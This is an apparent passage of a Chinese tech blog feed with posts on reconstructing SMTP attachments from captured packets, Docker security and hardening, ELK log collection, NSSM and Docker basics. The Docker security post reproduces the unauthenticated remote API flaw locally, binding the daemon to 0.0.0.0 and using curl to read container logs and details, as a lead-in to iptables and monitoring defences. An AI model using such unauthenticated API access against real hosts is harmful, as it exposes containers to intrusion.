&lt;h2 id=&quot;0x02-附件数据流抓取与解析&quot;&gt;&lt;a href=&quot;#0x02-附件数据流抓取与解析&quot; class=&quot;headerlink&quot; title=&quot;0x02 附件数据流抓取与解析&quot;&gt;&lt;/a&gt;0x02 附件数据流抓取与解析&lt;/h2&gt;&lt;p&gt;同样使用Python来编写（╮(╯▽╰)╭，Python用的熟），主要从网卡抓取到流量，先还原为完整的数据包，再做编码转换，将一个完整的邮件发送过程中的命令交互和邮件内容分别还原出来。&lt;/p&gt;
&lt;p&gt;程序监听网卡后，过滤出端口为25的tcp协议，过滤后的数据包大体结构如下所示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ethernet(dst=&amp;apos;xxx&amp;apos;, src=&amp;apos;xxx&amp;apos;, data=IP(len=78, id=44381, off=16384, p=6, sum=52034, src=&amp;apos;xxx&amp;apos;, dst=&amp;apos;xxx&amp;apos;, opts=&amp;apos;&amp;apos;, data=TCP(sport=25, dport=45675, seq=175475907, ack=2692538927L, flags=24, win=229, sum=40326, opts=&amp;apos;&amp;apos;, data=&amp;apos;220 localhost ESMTP Postfix (Ubuntu)\r\n&amp;apos;)))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;和我们在基础知识中提到的数据包结构一样，这里完整的获得了从Ethernet到TCP层的数据。这一条抓取到是Ubuntu邮件服务器发送给我们的欢迎信息。当然，大概了解了抓取到的包解构后，略过其他重要信息，我们直奔主题，去寻找数据包中附件的部分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160802213609.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了便于展示，这里使用Wireshark重复再抓取一次电子邮件的包，可以从图中看到，这些被分割成相同的1440bytes大小的数据包就是我们所传的图片附件，而在我们的程序中，它是接下来这个样子的，数据较长，这里截取一部分。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Content-Type: multipart/alternative; 

boundary=&amp;quot;===============0786123174==&amp;quot;\r\n

MIME-Version: 1.0\r\n

From: \r\n

Subject: \r\n\r\n
--===============0786123174==\r\n
Content-Type: text/plain; 
charset=&amp;quot;us-ascii&amp;quot;\r\n
MIME-Version: 1.0\r\n
Content-Transfer-Encoding: 7bit\r\n\r\n123456\r\n
--===============0786123174==\r\n
Content-Type: image/png\r\n
MIME-Version: 1.0\r\n
Content-Transfer-Encoding: base64\r\n
Content-ID: application/octet-stream\r\n


iVBORw0KGgoAAAANSUhEUgAAAKoAAA
FHCAYAAAAx29dqAAAgAElEQVR4nKy9d5T
c2XXfeSt0d3XO\r\nOQNooLuR02ByYpjhcEi
KSTYlS5S0+4dE7ZElK9iWLC+8Pmd3La20K1
nBa3ltr5UlUiaXEidxhhPA\r\nmUEaAING6Eb
onFN1d3VVdcW9n/v7vUIDA1IkjwqnUNW/
+oX37vvefN97gf/9f/2/89PT01JdXSWV\r\n
lZWytLwsHR0dsh5dk83NTVldXZWmpiZpa
GiQYDAonDs2NiadnZ2yrOc+9NBDcvvWL
akor5BUKmXn\r\nXbly
.............
.............
.............
l7wVOj83I4AAAAASUVORK5CYII=\r\n
--===============0786123174==--\r\n
.\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单分析一下，在这里，我们传递的真是多MIME的邮件，第一个分隔符以上说明是多部分合在一起，第一段内是邮件的发送者信息和标题，第二段是我们传递的邮件正文，第三段是附件。重点再看一下第三部分，第三部分首先声明了附件类型、编码方式,紧接着就是文件二进制的base64编码。&lt;/p&gt;
&lt;p&gt;通过上述分析，为了能够还原出附件，我们大致需要进行以下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;准确分离出一封完整的邮件&lt;/li&gt;
&lt;li&gt;准确分离出附件段&lt;/li&gt;
&lt;li&gt;从附件段分离出附件的base64编码正文&lt;/li&gt;
&lt;li&gt;将base64解码为二进制文件&lt;/li&gt;
&lt;li&gt;获取当前文件类型，保存二进制文件为当前文件类型&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一次完整的发送过程包括若干次完整的包，我们需要保存这一次发送中的若干个包，这就需要我们在捕捉到的多次发送包中先匹配出邮件开始和结束的标志，从上面可以看到，邮件结束时都使用一个单行的“.”来标志。我们匹配出完整的邮件包后，根据边界标志来匹配出附件部分的文件类型声明和编码正文，得到正文后我们使用Python的base64模块进行解码，将解码后的文件存成相应类型，就基本完成了附件的还原。&lt;/p&gt;
&lt;h2 id=&quot;0x03-存在的问题&quot;&gt;&lt;a href=&quot;#0x03-存在的问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 存在的问题&quot;&gt;&lt;/a&gt;0x03 存在的问题&lt;/h2&gt;&lt;p&gt;上面对于一次单一的发送行为做了附件还原，但其实还有很多问题有待解决。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;TCP发送过程中存在重复发送和乱序的问题，需要一定的机制去做判断，暂时想到的方法是使用TCP包中的Seq和Ack参数按照包编号和大小去逐个递增查找&lt;/li&gt;
&lt;li&gt;多个发送行为存在的时候，如何在可能交叉的发送包中匹配出一次完整的发送包&lt;/li&gt;
&lt;li&gt;当发送程序使用不同的编码时，还需要获取到编码方式再对应进行解码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接下来将会侧重于这部分问题解决方法的探索~~ &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;SMTP作为一种广泛使用的文件传输协议，已经和POP等协议一同构成了电子邮件系统传输的基石，针对于协议的分析也有很多书籍和博文可以参考，但是在这当中，对于MIME附件的数据流还原能找到的参考不多，所以在这里记下实践心得。&lt;/p&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.github.io/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="SMTP" scheme="http://phantom0301.github.io/tags/SMTP/"/>
    
      <category term="协议分析" scheme="http://phantom0301.github.io/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>再探Docker-另类Docker安全</title>
    <link href="http://phantom0301.github.io/2016/07/21/Docker3/"/>
    <id>http://phantom0301.github.io/2016/07/21/Docker3/</id>
    <published>2016-07-21T05:53:06.000Z</published>
    <updated>2016-08-04T08:00:35.132Z</updated>
    
    <content type="html">&lt;p&gt;Docker怎么做才能在被别人拿到SHELL后将危害做到最小？&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-别人说&quot;&gt;&lt;a href=&quot;#0x01-别人说&quot; class=&quot;headerlink&quot; title=&quot;0x01 别人说&quot;&gt;&lt;/a&gt;0x01 别人说&lt;/h2&gt;&lt;p&gt;Docker安全的问题有许多的相关文章分析，援引“Docker安全那些事”中提到的，Docker安全具体应该说分为Docker自身安全和Docker镜像安全两种，Docker之前有记录的漏洞分别是1.3和1.6，而现在的版本已经到1.12，到现在为止都没有再爆出漏洞的信息，而且Docker自身的安全往往是和Linux的底层功能息息相关的，这也是我不懂的领域。&lt;/p&gt;
&lt;p&gt;还有一个特别的点就是Docker的远程调用API接口存在未授权访问，但其实导致这个问题的是Docker的服务端程序Docker daemon被绑定到了公网的端口上，并且没有增加认证。默认情况下Docker daemon使用的是sock监听，本身只有root和docker用户组才有权限，所以不进行验证。换句话说，如果你不打算通过网络执行Docker命令或者增加证书验证的环节,这种漏洞就可以避免。&lt;/p&gt;
&lt;p&gt;我们可以在本地复现一下这个漏洞，首先我们关闭Docker daemon的本地sock，开启远程访问，并绑定端口。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;service stop docker
docker daemon -H unix:///var/run/docker.sock -H 0.0.0.0:9090
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后我们访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl http://127.0.0.1:9090/containers/json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们来获取一些敏感的信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl http://127.0.0.1:9090/containers/(id)/logs?stdout=1

curl http://127.0.0.1:9090/containers/(id)/json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外通过Post包我们还可以新建、开启和关闭容器。&lt;/p&gt;
&lt;p&gt;相关的参考文件：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/48689&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://yq.aliyun.com/articles/48689&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed4fece7631040973b5b1597634b928d483493cf5f93130601127ba5e065635559809e203c4bee084beb812173401420b786cb8d4cdebf8f3c6ad567627f4adb104b8459b8ca3632b122872ae9b868edad834284afa2c4ae5244bb56120c82e7f8511715ba7881672692a6&amp;amp;p=8b2a9715d9c042a40caa8c0c4e47c6&amp;amp;newp=817ec54ad5c04ab94ebcc7710f0090231615d70e37d1da01298ffe0cc4241a1a1a3aecbf26201403d6cf7f6604a94c5feff53c78340634f1f689df08d2ecce7e399e76&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=Docker%B0%B2%C8%AB%C4%C7%D0%A9%CA%C2&amp;amp;qid=e65331f700005115&amp;amp;p1=5&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Docker安全那些事&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.91ri.org/15837.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.91ri.org/15837.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x02-另类视角一：孤岛限制&quot;&gt;&lt;a href=&quot;#0x02-另类视角一：孤岛限制&quot; class=&quot;headerlink&quot; title=&quot;0x02 另类视角一：孤岛限制&quot;&gt;&lt;/a&gt;0x02 另类视角一：孤岛限制&lt;/h2&gt;&lt;p&gt;我们这里谈到的安全，将从另一个视角来解读，假设我们默认部署好的容器应用存在某种漏洞而被利用，最坏的情况是攻击者完全拿下了容器并且取得了root权限。可以预想到的是，在默认的配置下，拥有root权限的Docker就如同真正的跳板机一样，容器如同使用宿主机作为路由器的主机，不仅能够扫描到宿主机的端口情况，还可以扫描到宿主机所在网段的拓扑。&lt;/p&gt;
&lt;p&gt;最初是想在宿主机上做端口转发策略的限制，进而限制容器访问到更大范围的局域网。本以为在宿主机上的端口转发并不会影响宿主机的网络访问功能。使用如下指令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sysctl net.ipv4.ip_forward
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在宿主机上运行上面的指令可以查看当前的转发策略是否开启，当键值为1时表示开启，此时的容器网络访问是畅行无阻的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo sysctl -w net.ipv4.ip_forward=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用上面的命令可以临时将这个参数的键值改为0，此时我们发现容器只能访问到同一网段的其它容器而无法访问到宿主机所在的局域网中，与此同时，我们只要保证作为路由器的宿主机上没有运行开启端口的应用，就应该是安全的。可是随后注意到一个问题，关闭容器对外的端口转发后，外界对于容器的访问也一起被禁止了。&lt;/p&gt;
&lt;p&gt;这样的话，只能乖乖的在iptables上做文章了。因为不是介绍iptables的文章，就不多对这个Linux下自带的防火墙做过多的介绍。我的想法是使用宿主机的iptables禁止相应的应用容器访问外网（包括宿主机所在的局域网），这样既能实现容器限制，又不会影响外界访问容器。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo iptables -I FORWARD -i docker0 -o ens33 -j DROP
sudo iptables -I FORWARD -i docker0 -o ens33 -m state --state RELATED,ESTABLISHED  -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该命令可以从宿主机的层面限制容器对外的访问，这样可以从一定程度上解决通过容器做跳板的问题。这样的场景实际上就像是将容器设置成只有一条单向入口的孤岛，只允许外界对容器进行访问，而不允许使用容器在做进一步的其它网络访问。&lt;/p&gt;
&lt;h2 id=&quot;0x03-另类视角二：文件监控&quot;&gt;&lt;a href=&quot;#0x03-另类视角二：文件监控&quot; class=&quot;headerlink&quot; title=&quot;0x03 另类视角二：文件监控&quot;&gt;&lt;/a&gt;0x03 另类视角二：文件监控&lt;/h2&gt;&lt;p&gt;除了上述限制的方法外，我们还可以对于容器中的重点文件夹或文件做监控，一旦检测到相应的文件发生变化，可以立即重新生成新的镜像，以应对攻击。&lt;/p&gt;
&lt;p&gt;这里的架构思路如下，作为监控程序，它不应该位于目标容器内，所以我们考虑使用我在上一个谈论Docker日志的笔记里提到的挂载的方式，将容器内部重要的文件夹挂载进监控容器内，在监控容器内运行程序监控相应文件的增、删、改等操作，一旦发现不被允许的操作执行，就关闭容器或者重新构建容器。具体文件监控容器方面的学习有机会再在后面贴出。&lt;/p&gt;
&lt;h2 id=&quot;0x04-综述&quot;&gt;&lt;a href=&quot;#0x04-综述&quot; class=&quot;headerlink&quot; title=&quot;0x04 综述&quot;&gt;&lt;/a&gt;0x04 综述&lt;/h2&gt;&lt;p&gt;Docker一旦部署到真实环境中，我们就要对它的安全性做全面的衡量，不过通过上述分析，在排除可能存在0Day的情况下，只要配置得当，Docker的安全性还是有保障的。&lt;/p&gt;
&lt;p&gt;由于容器的便携性、易部署性、隔离性，我们可以很方便的在部署容器服务的同时，连带部署一系列的监控、处理容器对于服务容器做维护。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Docker怎么做才能在被别人拿到SHELL后将危害做到最小？&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://phantom0301.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://phantom0301.github.io/tags/Docker/"/>
    
      <category term="信息安全" scheme="http://phantom0301.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="入门" scheme="http://phantom0301.github.io/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>再探Docker-日志收集</title>
    <link href="http://phantom0301.github.io/2016/07/20/Docker2/"/>
    <id>http://phantom0301.github.io/2016/07/20/Docker2/</id>
    <published>2016-07-20T08:11:59.000Z</published>
    <updated>2016-08-04T08:01:46.972Z</updated>
    
    <content type="html">&lt;p&gt;一次Docker项目需求构架的尝试    &lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-方法选择&quot;&gt;&lt;a href=&quot;#0x01-方法选择&quot; class=&quot;headerlink&quot; title=&quot;0x01 方法选择&quot;&gt;&lt;/a&gt;0x01 方法选择&lt;/h2&gt;&lt;p&gt;当我们的Docker部署完成后，为了能够掌握Docker的状态，除了使用logs、event、diff等实时运维命令查看外，我们还存在需要对Docker产生的日志进行收集整理分析的必要。&lt;/p&gt;
&lt;p&gt;网上能找到的日志收集系统有很多，例如Flume、Fluentd、Logstash等等。经过一段时间的摸索搭建，个人最容易搭建成功的是Logstash，而且整个ELK体系也提供一套完整的日志收集、存储、查找、可视化流程，可以省去很多编写中间件的精力。&lt;/p&gt;
&lt;h2 id=&quot;0x02-调试&quot;&gt;&lt;a href=&quot;#0x02-调试&quot; class=&quot;headerlink&quot; title=&quot;0x02 调试&quot;&gt;&lt;/a&gt;0x02 调试&lt;/h2&gt;&lt;p&gt;所以最终我的整体架构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker1\
        \
docker2——————&amp;gt;docker-logstash————&amp;gt;任意机器（可以不是宿主机）
        /
docker3/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ELK一整套工具可以很方便的从Elastic的官网上下到，在这里就不在赘述。在任意一台主机上安装Elasticsearch和Kibana，在宿主机上安装不同的Docker以及一个Logstash的Docker。这里我使用我在上一篇博客中编译好的Wordpress的Docker。不同的是我需要将WP中记录日志的文件夹挂载到logstash-docker上。命令如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -d -v /var/log/nginx/ --name wordpress -p 0.0.0.0:80:80 long/wordpress
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单解释一下这条命令，我们运行了之前编译好的Wordpress，将其中的Nginx下的日志挂载出来。&lt;/p&gt;
&lt;p&gt;接下来，我们再从官网仓库中pull下Docker版的Logstash，使用如下命令开启：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -it --rm --volumes-from wordpress -v &amp;quot;$PWD&amp;quot;:/home  logstash logstash -f /home/test.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有几个坑要事先声明一下，一个是这里我使用了Logstash的配置文件，而这个配置文件我是从宿主机挂载到容器的home文件夹下，另一个点就是Logstash容器从Wordpress中接手之前挂载的文件夹，从里面实时增量读取日志，但是两个容器的权限不对应，所以要注意在Wordpress容器对相应的文件夹做权限变更。&lt;/p&gt;
&lt;p&gt;Logstash的配置文件我写法如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;input {
    file {
        path =&amp;gt; &amp;quot;xxxx&amp;quot;
        start_position =&amp;gt; beginning
         }
      }
filter {

       }

output {
    stdout { }
       }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从日志中读取信息，打印在标准输出中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker21.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这一步调试成功后，我们接着调试Elastic的部分，Elastic+Kibana我是运行在一台Windows的主机上的，运行前调整Elastic的配置文件中的，使得宿主机可以访问到它，当然这里的访问是没有任何认证的，但是作为测试，我们先不讨论安全问题。&lt;/p&gt;
&lt;p&gt;通过windows主机访问宿主机上的Wordpress-docker，然后访问&lt;/p&gt;
&lt;p&gt;此时，宿主机中容器的日志已经显示在了Windows的主机中。&lt;/p&gt;
&lt;h2 id=&quot;0x03-总结&quot;&gt;&lt;a href=&quot;#0x03-总结&quot; class=&quot;headerlink&quot; title=&quot;0x03 总结&quot;&gt;&lt;/a&gt;0x03 总结&lt;/h2&gt;&lt;p&gt;利用这种方式，我们实现了容器日志传输到任意主机上存储的目的，而日志传输则是通过在多个容器之间挂载目录实现。这样做，可以很好的实现应用、日志（或数据）之间的解耦合，将重要日志存储在更安全的实体主机上，便于实现中心对应分布的日志分析。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;一次Docker项目需求构架的尝试    &lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://phantom0301.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://phantom0301.github.io/tags/Docker/"/>
    
      <category term="入门" scheme="http://phantom0301.github.io/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>效率利器-NSSM</title>
    <link href="http://phantom0301.github.io/2016/07/19/NSSM/"/>
    <id>http://phantom0301.github.io/2016/07/19/NSSM/</id>
    <published>2016-07-19T13:20:30.000Z</published>
    <updated>2016-08-04T07:59:37.035Z</updated>
    
    <content type="html">&lt;p&gt;NSSM(the Non-Sucking Service Manager),作为英语战五渣，为了弄清它的中文译名也是查了很多资料，关键在于Non-Sucking这个词应该如何翻译，姑且翻译成“不糟糕的服务管理器”这样页游装备名般的中文。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;言归正传，NSSM是一款开源的Windows下”好用的服务管理工具”，根据它自己的介绍，之所以叫“Non-Sucking”,是因为其他类似的工具都不能很好的处理正在运行中的应用失败的情况。感觉上它有点像Ubuntu下的supervisor。&lt;/p&gt;
&lt;p&gt;而服务管理工具的作用其实就是将运行的应用封装成系统服务，这样针对于一些bat的脚本程序可以快速执行操纵命令并监控程序是否存活,就像下面的样子，我将ELK应用作为服务来启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/N1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下载方面可以访问这个地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nssm.cc/download&quot; title=&quot;https://nssm.cc/download&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://nssm.cc/download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用方面十分简单，将下载好的文件进行解压，再将nssm.exe复制到需要启动的应用所在目录中，在当前目录执行cmd命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nssm install &amp;lt;servicename&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时就会弹出安装界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://nssm.cc/images/install_application.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在Application界面的Path配置需要启动的exe或者bat等程序的路径，Detail界面命名服务名和描述信息，Dependencies界面配置依赖的环境，就是已有的服务名。&lt;/p&gt;
&lt;p&gt;将这些基本信息配置好后，点击Install service安装完毕。&lt;/p&gt;
&lt;p&gt;这个时候，可以在控制面板-管理-服务中看到已经安装成功的服务，通过这个界面可以打开服务，这时，你所指定的程序应用就以服务的名义运行起来了。&lt;/p&gt;
&lt;p&gt;先在这里安利这款工具以及它的基本运行命令，详细的官方文档有时间会在后面翻译出来吧~~&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;NSSM(the Non-Sucking Service Manager),作为英语战五渣，为了弄清它的中文译名也是查了很多资料，关键在于Non-Sucking这个词应该如何翻译，姑且翻译成“不糟糕的服务管理器”这样页游装备名般的中文。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://phantom0301.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Docker快速入门</title>
    <link href="http://phantom0301.github.io/2016/07/16/Docker1/"/>
    <id>http://phantom0301.github.io/2016/07/16/Docker1/</id>
    <published>2016-07-16T01:14:01.000Z</published>
    <updated>2016-08-04T07:55:36.795Z</updated>
    
    <content type="html">&lt;p&gt;套用介绍Docker的话，Docker是一个开源的引擎，可以创建一个轻量级的虚拟系统。由于它可以更加轻量级的实现虚拟机的作用，而且它自带很多很方便的监控运行系统状态的特性，所以受到大家的青睐。&lt;/p&gt;
&lt;p&gt;这篇博客旨在快速部署Docker，并不是对Docker进行深入研究，所以只会说说我在实际用Docker的过程中使用频次较高的实际指令，并不会详细介绍Docker基于Linux的底层实现原理和理论的东西，如果有错误请留言指正。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-基本部署&quot;&gt;&lt;a href=&quot;#0x01-基本部署&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本部署&quot;&gt;&lt;/a&gt;0x01 基本部署&lt;/h2&gt;&lt;p&gt;这里我使用Ubuntu16.04进行测试。先说说Docker的安装，最简单的方法的直接使用Ubuntu的apt-get安装：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get install docker
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而我为了能够安装最新版的Docker，使用下面更加复杂的方法：&lt;/p&gt;
&lt;p&gt;1.升级source列表，安装相应的ca证书&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get install apt-transport-https ca-certificates
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.增加密钥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.添加源列表文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo vi /etc/apt/sources.list.d/docker.list
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.按照系统版本增加entry&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo deb https://apt.dockerproject.org/repo ubuntu-xenial main
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.安装docker并测试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get install docker-engine
sudo service docker start
sudo docker run hello-world
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个时候docker程序会先检查本地仓库是否有镜像，如果没有，就会从官方的仓库中拉取相应的镜像并运行它。而这个hello-world的程序还会打印出官方的一些帮助信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x02-常用命令&quot;&gt;&lt;a href=&quot;#0x02-常用命令&quot; class=&quot;headerlink&quot; title=&quot;0x02 常用命令&quot;&gt;&lt;/a&gt;0x02 常用命令&lt;/h2&gt;&lt;p&gt;接着上一节拉取到的镜像，我们就用这个镜像说明Docker会经常用到的一些指令。&lt;/p&gt;
&lt;p&gt;0.快速的搜寻镜像&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker search 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种方法可以快速的从官方仓库查找可用的镜像，相比起直接访问官网查询，这种方法不用太多的等待，不足之处在于，作为初心者，这种方式几乎看不到镜像的详细使用说明，对新手的使用并不够友好，而在官网上可以看到作者的详细使用说明和Dockerfile文件，更适合我们入门学习。&lt;/p&gt;
&lt;p&gt;1.安静的拉取镜像&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker pull 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个命令只会从官方仓库下载镜像到本地，并不会执行生成容器。 &lt;/p&gt;
&lt;p&gt;2.方便的掌握镜像&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker images
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看本地仓库中的可用镜像&lt;/p&gt;
&lt;p&gt;3.常用的运行方式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -it 镜像名或id /bin/bash
docker run -d 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上两种是学习过程中经常能够看到的命令，前者适合对于生成的容器进行调试，而且即使没有前台进程（后面会说这个的关系），它也可以运行起来；后者多作为真正部署时使用。&lt;/p&gt;
&lt;p&gt;之所以会这样，当然是因为run后面不同的参数值了，i参数是为了保持stdin打开，t参数是为了维持一个为终端，而d参数测试在后台运行容器。&lt;/p&gt;
&lt;p&gt;当容器运行在后台时，它就有点像我们通常在Windows下执行可执行程序的逻辑，当没有循环或者其他逻辑维持它的前台进程时，容器就会自动结束。所以当使用d参数时，就需要有一个前台进程来保持容器的运行。&lt;/p&gt;
&lt;p&gt;run指令下还有一些常用的参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-a参数，负责进行连接附加，可以连接标准输入输出等
-e参数，设置环境变量，例如一些数据库镜像的生成时的参数
--name，重命名容器，方便进行管理，避免了你输入那些随机生成的科学家名或者ID
-p参数，将容器内的端口映射到宿主机相应端口
-v参数，挂载容器内的内容
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其他参数可以直接查阅手册，这里只列出了我常用到的参数。&lt;/p&gt;
&lt;p&gt;示例如下：&lt;/p&gt;
&lt;p&gt;我们运行一个由我自己编译的wordpress镜像，内置数据库&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们先用images查看可用的镜像&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/docker3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在使用下面这个指令来启动镜像，生成容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker -d --name wordpress -p 0.0.0.0：80：80 镜像名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成的同时，容器被赋予了一个唯一的ID&lt;/p&gt;
&lt;p&gt;4.常用的维护命令&lt;/p&gt;
&lt;p&gt;还是如上图&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker ps 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以查看正在运行的容器和基本信息，而-l参数则显示上一次运行过的容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker inspect 容器名或id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以查看容器的详细信息，这个指令的输出较多，就不截图了。不过这个指令结果里有几个重要参数值的我们注意：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;容器的宿主机存储路径，包括容器主机名、配置信息、日志等&lt;/li&gt;
&lt;li&gt;容器映射出的端口信息&lt;/li&gt;
&lt;li&gt;网络服务的配置信息，包括容器ip、DNS等&lt;/li&gt;
&lt;li&gt;运行环境的配置信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;……&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这些信息可以帮助我们更好的去认识镜像、容器、宿主机之间的关系&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker exec -it 容器名 /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这条指令可以方便我们去访问后台运行状态的容器内部，进行修改添加应用，当然，也可以在一开始就给容器开一个ssh进行管理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker events/logs/info
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这几条指令都是将容器当前运行的一些事件、日志信息输出到宿主机界面上，方便我们进行容器部署应用的观察和管理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker commit 容器名 镜像名：标签
